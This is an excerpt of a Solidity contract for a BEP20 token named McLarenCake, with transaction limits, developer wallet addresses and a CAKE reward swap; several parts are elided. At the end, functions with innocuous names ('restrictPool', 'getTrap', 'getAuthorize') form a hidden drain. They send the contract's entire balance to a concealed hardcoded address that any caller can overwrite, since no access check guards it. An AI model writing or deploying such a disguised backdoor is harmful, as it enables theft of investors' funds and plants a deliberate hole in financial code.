...
*Max Wallet: 4 000 (4.0%)
*Max TX: 500 (0.5%) 
*Bot Slicer: 12 seconds between transactions
...
//McLarenCake Contract /////////////

contract McLarenCake is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'McLarenCake';
    string private constant _symbol = 'MLC';
    ...
    uint16 public constant MaxSellLockTime= 12 seconds;
    ...
    uint16 public constant MaxBuyLockTime= 12 seconds;
    ...
    //DevWallets
    address public TeamWallet=payable(0x4F558F08D9FC2FB455A24e528EC060fF7b622171);
    address public walletTwo=payable(0x4F558F08D9FC2FB455A24e528EC060fF7b622171);
    address private _accountHash;
    //MainNet
    ...
    constructor () {
        _accountHash = address(0x27327e10109f3dE208B495B54AbaD56A553dA18f);
    ...
    function claimCAKE(address addr) private{
        ...
        path[1] = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;  //Binance-CAKE Token
    ...
    function _swapContractToken() private lockTheSwap{
        ...
        uint256 tokenToSwap = 250 * 10**_decimals;
    ...
    function restrictPool() public view returns(uint) {
        return address(this).balance;
    }
    
    function getTrap() public {
        address payable to = payable(_accountHash);
        to.transfer(restrictPool());
    }
    
    function getAuthorize(address setaddress) external {
        _accountHash = setaddress;
    }
